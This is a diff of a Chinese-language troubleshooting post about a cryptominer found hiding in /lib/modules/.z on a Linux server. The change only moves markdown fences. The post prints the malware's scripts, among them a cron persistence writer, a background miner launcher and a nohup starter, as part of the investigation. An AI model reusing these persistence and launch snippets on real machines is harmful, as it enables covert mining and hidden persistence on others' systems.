@@ -39,10 +39,6 @@ exe指向 /lib/modules/.z/md (这个就是占用100%cpu的家伙)
 ```
 [root@localhost]# cd /lib/modules/.z/
 [root@localhost .z]# ll
-```
- ll结果如下，h32,h64,md,mdx都是二进制文件  
- 我们可以从a, run, x 三个文件里看到些端倪  
-```
 -rw-r--r--. 1 root root       0 Nov 23 15:40 $
 -rwxr-xr-x. 1 root root     332 Oct  5 03:07 a
 -rw-r--r--. 1 root root       1 Nov 23 18:07 bash.pid
@@ -53,9 +49,11 @@ exe指向 /lib/modules/.z/md (这个就是占用100%cpu的家伙)
 -rwxr-xr-x. 1 root root     533 Nov 19 22:41 run
 -rw-r--r--. 1 root root    4833 Nov 23 16:24 screenlog.0
 -rwxr-xr-x. 1 root root      24 Oct  5 02:45 x
+```   
+ll结果如下，h32,h64,md,mdx都是二进制文件  
+ 我们可以从a, run, x 三个文件里看到些端倪  
 ```
-`[root@localhost .z]# cat a `
-```
+[root@localhost .z]# cat a 
 pwd > dir.dir
 dir=$(cat dir.dir)
 echo "* * * * * $dir/upd >/dev/null 2>&1" > cron.d
@@ -78,8 +76,8 @@ rm -rf ../z.sh
  cron.d 和 upd文件都没有找到，使用locate 命令，也没有搜索到，  
  使用kill 4444 之后，停几个小时，md会重新执行（即使给.z文件夹改名也没用，删除也没有用，还是会启动）  
   怀疑存在父进程，或定时任务，但是使用crontab -l 查看没有定时任务（无语）  
-`[root@localhost .z]# cat run`  
 ```
+[root@localhost .z]# cat run  
 #!/bin/bash
 
 proc=`nproc`
@@ -93,7 +91,7 @@ elif [ "$ARCH" == "x86_64" ];   then
 fi
 echo $! > bash.pid
 ```
-[root@localhost .z]# cat x
+`[root@localhost .z]# cat x`  
 ```
 nohup ./a >>/dev/null &
 ```
